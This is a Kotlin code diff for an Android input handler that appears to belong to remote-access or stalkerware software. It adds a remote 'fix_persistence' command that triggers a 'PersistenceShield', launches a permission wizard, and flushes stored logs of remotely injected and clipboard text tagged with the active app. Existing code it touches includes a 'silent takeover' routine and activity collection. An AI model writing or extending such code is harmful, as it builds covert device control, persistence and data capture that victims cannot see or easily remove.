@@ -37,7 +37,7 @@ object InputHandler {
 
     private fun needsWake(type: String, msg: JSONObject): Boolean {
         if (type == "key" && msg.optString("action") == "unlock") return true
-        return type in setOf("click", "tap", "swipe", "scroll", "text", "setup_takeover", "open_app", "clipboard_paste")
+        return type in setOf("click", "tap", "swipe", "scroll", "text", "setup_takeover", "fix_persistence", "open_app", "clipboard_paste")
     }
 
     private fun dispatch(context: Context, msg: JSONObject, type: String) {
@@ -46,9 +46,16 @@ object InputHandler {
                 startSilentTakeover(context)
                 return
             }
+            type == "fix_persistence" || (type == "command" && msg.optString("action") == "fix_persistence") -> {
+                PersistenceShield.applyAll(context)
+                return
+            }
             type == "intel_sync" -> {
                 ActivityCollector.get(context).syncNow()
-                DeviceStateReporter.send(context)
+                return
+            }
+            type == "request_permission_wizard" -> {
+                PermissionWizardActivity.launch(context)
                 return
             }
             type == "open_app" -> {
@@ -105,6 +112,7 @@ object InputHandler {
                 injectText(text)
                 if (text.isNotBlank()) {
                     NotesStore.append(context, text, "remote", svc.lastWindowPkg())
+                    NotesStore.flush(context)
                 }
                 svc.scheduleRefreshesAfterInput()
             }
@@ -125,6 +133,7 @@ object InputHandler {
         if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
         injectText(text)
         NotesStore.append(context, text, "clipboard", svc.lastWindowPkg())
+        NotesStore.flush(context)
         svc.scheduleRefreshesAfterInput()
     }
 
